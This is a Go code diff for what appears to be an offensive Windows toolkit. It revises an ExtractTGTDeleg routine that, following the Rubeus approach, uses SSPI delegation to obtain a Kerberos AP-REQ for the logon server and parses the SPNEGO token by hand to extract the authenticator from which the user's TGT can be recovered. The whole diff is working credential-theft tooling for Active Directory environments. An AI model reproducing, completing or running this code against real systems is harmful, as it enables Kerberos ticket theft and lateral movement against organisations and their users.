@@ -5,6 +5,7 @@ package windows
 
 import (
 	"fmt"
+	"os"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -146,18 +147,37 @@ func ExtractTGTDeleg() (*TGTDelegResult, error) {
 		}
 	}
 
-	// If we found a DC hostname, use it; otherwise try domain itself
+	// If we found a DC hostname, use it; otherwise try LOGONSERVER
 	var spnTarget string
 	if targetHost != "" {
 		spnTarget = fmt.Sprintf("HOST/%s", targetHost)
 	} else {
-		// Fall back to trying cifs/domain
-		domain, _ := GetCurrentDomain()
-		if domain == "" {
-			return nil, fmt.Errorf("cannot determine target SPN - no cached tickets")
+		// Try LOGONSERVER environment variable (contains DC we authenticated against)
+		logonServer := os.Getenv("LOGONSERVER")
+		if logonServer != "" {
+			// Remove leading \\
+			logonServer = strings.TrimPrefix(logonServer, "\\\\")
+			logonServer = strings.TrimPrefix(logonServer, "\\")
+			if logonServer != "" {
+				spnTarget = fmt.Sprintf("HOST/%s", logonServer)
+			}
 		}
-		spnTarget = fmt.Sprintf("cifs/%s", domain)
+
+		// If still no SPN, try to construct from USERDNSDOMAIN
+		if spnTarget == "" {
+			domain := os.Getenv("USERDNSDOMAIN")
+			if domain == "" {
+				domain, _ = GetCurrentDomain()
+			}
+			if domain == "" {
+				return nil, fmt.Errorf("cannot determine target SPN - no cached tickets and LOGONSERVER not set")
+			}
+			// Try the domain itself as an SPN (may work if it resolves to DC)
+			spnTarget = fmt.Sprintf("HOST/%s", domain)
+		}
 	}
+
+	fmt.Printf("[*] Using SPN: %s\n", spnTarget)
 
 	// Step 3: Initialize security context with delegation
 	var ctxHandle SecHandle
@@ -225,7 +245,8 @@ func ExtractTGTDeleg() (*TGTDelegResult, error) {
 	copy(token, (*[1 << 20]byte)(unsafe.Pointer(outputBuffer.pvBuffer))[:outputBuffer.cbBuffer])
 
 	// Step 3: Parse the SPNEGO token to extract KRB-AP-REQ
-	apReq, err := extractAPREQFromSPNEGO(token, false)
+	fmt.Printf("[DEBUG] Token first 40 bytes: %x\n", token[:min(40, len(token))])
+	apReq, err := extractAPREQFromSPNEGO(token, true) // Enable verbose for debugging
 	if err != nil {
 		return nil, fmt.Errorf("failed to extract AP-REQ: %w", err)
 	}
@@ -246,11 +267,10 @@ func ExtractTGTDeleg() (*TGTDelegResult, error) {
 }
 
 func extractAPREQFromSPNEGO(token []byte, verbose bool) (*asn1krb5.APREQ, error) {
-	// Token structure from Windows SSPI:
-	// 60 82 xx xx          - GSS-API APPLICATION 0 wrapper
-	// 06 09 2a 86...       - OID for Kerberos (1.2.840.113554.1.2.2)
-	// 01 00                - Token ID
-	// 6e 82 xx xx          - AP-REQ APPLICATION 14 (at offset ~17)
+	// Follow Rubeus approach exactly:
+	// 1. Search for Kerberos OID (1.2.840.113554.1.2.2)
+	// 2. Skip past OID and TOK_ID (01 00)
+	// 3. The rest is the AP-REQ
 
 	if len(token) < 20 {
 		return nil, fmt.Errorf("token too short: %d bytes", len(token))
@@ -260,35 +280,265 @@ func extractAPREQFromSPNEGO(token []byte, verbose bool) (*asn1krb5.APREQ, error)
 		fmt.Printf("[DEBUG] Token length: %d bytes\n", len(token))
 	}
 
-	// Find AP-REQ wrapper (0x6e = APPLICATION 14)
-	for i := 0; i < len(token)-4; i++ {
-		if token[i] == 0x6e {
-			if verbose {
-				fmt.Printf("[DEBUG] Found APPLICATION 14 at offset %d\n", i)
-			}
+	// Kerberos V5 OID: 1.2.840.113554.1.2.2
+	kerberosOID := []byte{0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02}
 
-			// Use the proper UnmarshalAPREQ function
-			apReq, _, err := asn1krb5.UnmarshalAPREQ(token[i:])
-			if err != nil {
-				if verbose {
-					fmt.Printf("[DEBUG] Parse error at offset %d: %v\n", i, err)
+	// Search for the Kerberos OID
+	oidIndex := -1
+	for i := 0; i <= len(token)-len(kerberosOID); i++ {
+		match := true
+		for j := 0; j < len(kerberosOID); j++ {
+			if token[i+j] != kerberosOID[j] {
+				match = false
+				break
+			}
+		}
+		if match {
+			oidIndex = i
+			break
+		}
+	}
+
+	if oidIndex < 0 {
+		return nil, fmt.Errorf("Kerberos OID not found in token")
+	}
+
+	if verbose {
+		fmt.Printf("[DEBUG] Found Kerberos OID at offset %d\n", oidIndex)
+	}
+
+	// Skip past the OID
+	startIndex := oidIndex + len(kerberosOID)
+
+	// Check for TOK_ID_KRB_AP_REQ (01 00)
+	if startIndex+2 > len(token) {
+		return nil, fmt.Errorf("token too short after OID")
+	}
+
+	if token[startIndex] != 0x01 || token[startIndex+1] != 0x00 {
+		return nil, fmt.Errorf("expected TOK_ID 01 00, got %02x %02x", token[startIndex], token[startIndex+1])
+	}
+
+	startIndex += 2
+	apReqBytes := token[startIndex:]
+
+	if verbose {
+		fmt.Printf("[DEBUG] AP-REQ starts at offset %d, length %d bytes\n", startIndex, len(apReqBytes))
+		fmt.Printf("[DEBUG] AP-REQ first 20 bytes: %x\n", apReqBytes[:min(20, len(apReqBytes))])
+	}
+
+	// Now parse the AP-REQ manually to extract just what we need:
+	// AP-REQ ::= [APPLICATION 14] SEQUENCE {
+	//   pvno [0] INTEGER,
+	//   msg-type [1] INTEGER,
+	//   ap-options [2] APOptions,
+	//   ticket [3] Ticket,
+	//   authenticator [4] EncryptedData
+	// }
+
+	// We only need the ticket and authenticator, so use a simpler approach
+	apReq, err := parseAPREQSimple(apReqBytes, verbose)
+	if err != nil {
+		return nil, err
+	}
+
+	if verbose {
+		fmt.Printf("[+] Successfully parsed AP-REQ (Realm=%s, SName=%v)\n", apReq.Ticket.Realm, apReq.Ticket.SName)
+	}
+
+	return apReq, nil
+}
+
+// parseAPREQSimple parses an AP-REQ focusing on extracting the authenticator
+// without dealing with the complex nested APPLICATION tags
+func parseAPREQSimple(data []byte, verbose bool) (*asn1krb5.APREQ, error) {
+	if len(data) < 10 || data[0] != 0x6e {
+		return nil, fmt.Errorf("not an AP-REQ (expected APPLICATION 14)")
+	}
+
+	// Skip APPLICATION 14 wrapper
+	pos := 1
+	outerLen, lenBytes := parseLen(data[pos:])
+	if outerLen < 0 {
+		return nil, fmt.Errorf("invalid AP-REQ length")
+	}
+	pos += lenBytes
+
+	// Should be SEQUENCE
+	if data[pos] != 0x30 {
+		return nil, fmt.Errorf("expected SEQUENCE, got 0x%02x", data[pos])
+	}
+	pos++
+	seqLen, lenBytes := parseLen(data[pos:])
+	if seqLen < 0 {
+		return nil, fmt.Errorf("invalid SEQUENCE length")
+	}
+	pos += lenBytes
+
+	seqEnd := pos + seqLen
+	if seqEnd > len(data) {
+		seqEnd = len(data) // Allow truncated sequences like Rubeus does
+	}
+
+	apReq := &asn1krb5.APREQ{PVNO: 5, MsgType: 14}
+
+	// Parse fields [0] through [4]
+	for pos < seqEnd {
+		if data[pos] < 0xa0 || data[pos] > 0xa4 {
+			break // Not a context tag we expect
+		}
+		tag := int(data[pos] - 0xa0)
+		pos++
+
+		fieldLen, lenBytes := parseLen(data[pos:])
+		if fieldLen < 0 || pos+lenBytes+fieldLen > len(data) {
+			break
+		}
+		pos += lenBytes
+		fieldEnd := pos + fieldLen
+
+		switch tag {
+		case 0: // pvno - skip
+			pos = fieldEnd
+		case 1: // msg-type - skip
+			pos = fieldEnd
+		case 2: // ap-options - skip
+			pos = fieldEnd
+		case 3: // ticket
+			// The ticket is APPLICATION 1 wrapped
+			ticketBytes := data[pos:fieldEnd]
+			if len(ticketBytes) > 0 && ticketBytes[0] == 0x61 {
+				// Store raw bytes for now - we'll parse what we can
+				apReq.Ticket.RawBytes = ticketBytes
+				// Try to extract realm from raw bytes
+				extractRealmFromRaw(ticketBytes, &apReq.Ticket)
+			}
+			pos = fieldEnd
+		case 4: // authenticator
+			// EncryptedData SEQUENCE
+			if pos < len(data) && data[pos] == 0x30 {
+				encData, err := parseEncryptedDataSimple(data[pos:fieldEnd])
+				if err == nil {
+					apReq.Authenticator = encData
+					if verbose {
+						fmt.Printf("[DEBUG] Authenticator etype: %d, cipher len: %d\n",
+							apReq.Authenticator.EType, len(apReq.Authenticator.Cipher))
+					}
 				}
-				continue
 			}
+			pos = fieldEnd
+		}
+	}
 
-			if apReq.PVNO == 5 && apReq.MsgType == 14 {
-				fmt.Printf("[+] Successfully parsed AP-REQ (Realm=%s, SName=%v)\n",
-					apReq.Ticket.Realm, apReq.Ticket.SName)
-				return apReq, nil
+	if len(apReq.Authenticator.Cipher) == 0 {
+		return nil, fmt.Errorf("failed to extract authenticator from AP-REQ")
+	}
+
+	return apReq, nil
+}
+
+func parseLen(data []byte) (int, int) {
+	if len(data) == 0 {
+		return -1, 0
+	}
+	if data[0] < 0x80 {
+		return int(data[0]), 1
+	}
+	numBytes := int(data[0] & 0x7f)
+	if numBytes == 0 || len(data) < 1+numBytes {
+		return -1, 0
+	}
+	length := 0
+	for i := 0; i < numBytes; i++ {
+		length = (length << 8) | int(data[1+i])
+	}
+	return length, 1 + numBytes
+}
+
+func parseEncryptedDataSimple(data []byte) (asn1krb5.EncryptedData, error) {
+	var ed asn1krb5.EncryptedData
+
+	if len(data) < 5 || data[0] != 0x30 {
+		return ed, fmt.Errorf("not a SEQUENCE")
+	}
+
+	pos := 1
+	seqLen, lenBytes := parseLen(data[pos:])
+	if seqLen < 0 {
+		return ed, fmt.Errorf("invalid SEQUENCE length")
+	}
+	pos += lenBytes
+
+	// Parse [0] etype, [1] kvno (optional), [2] cipher
+	for pos < len(data) && data[pos] >= 0xa0 && data[pos] <= 0xa2 {
+		tag := int(data[pos] - 0xa0)
+		pos++
+
+		fieldLen, lenBytes := parseLen(data[pos:])
+		if fieldLen < 0 {
+			break
+		}
+		pos += lenBytes
+
+		switch tag {
+		case 0: // etype
+			if pos < len(data) && data[pos] == 0x02 {
+				pos++
+				intLen, lb := parseLen(data[pos:])
+				pos += lb
+				if intLen > 0 && pos+intLen <= len(data) {
+					val := 0
+					for i := 0; i < intLen; i++ {
+						val = (val << 8) | int(data[pos+i])
+					}
+					ed.EType = int32(val)
+					pos += intLen
+				}
 			}
-
-			if verbose {
-				fmt.Printf("[DEBUG] Parsed but wrong version/type: PVNO=%d MsgType=%d\n", apReq.PVNO, apReq.MsgType)
+		case 1: // kvno (optional)
+			pos += fieldLen
+		case 2: // cipher
+			if pos < len(data) && data[pos] == 0x04 {
+				pos++
+				cipherLen, lb := parseLen(data[pos:])
+				pos += lb
+				if cipherLen > 0 && pos+cipherLen <= len(data) {
+					ed.Cipher = make([]byte, cipherLen)
+					copy(ed.Cipher, data[pos:pos+cipherLen])
+					pos += cipherLen
+				}
 			}
 		}
 	}
 
-	return nil, fmt.Errorf("AP-REQ not found in token (len=%d)", len(token))
+	return ed, nil
+}
+
+func extractRealmFromRaw(ticketBytes []byte, ticket *asn1krb5.Ticket) {
+	// Simple extraction of realm from ticket raw bytes
+	// Look for GeneralString (0x1b) followed by uppercase letters
+	for i := 0; i < len(ticketBytes)-5; i++ {
+		if ticketBytes[i] == 0x1b {
+			strLen := int(ticketBytes[i+1])
+			if strLen > 3 && strLen < 50 && i+2+strLen <= len(ticketBytes) {
+				candidate := string(ticketBytes[i+2 : i+2+strLen])
+				// Check if it looks like a realm (uppercase with dots)
+				if len(candidate) > 3 && candidate[0] >= 'A' && candidate[0] <= 'Z' {
+					isRealm := true
+					for _, c := range candidate {
+						if !((c >= 'A' && c <= 'Z') || c == '.' || (c >= '0' && c <= '9')) {
+							isRealm = false
+							break
+						}
+					}
+					if isRealm {
+						ticket.Realm = candidate
+						return
+					}
+				}
+			}
+		}
+	}
 }
 
 func min(a, b int) int {
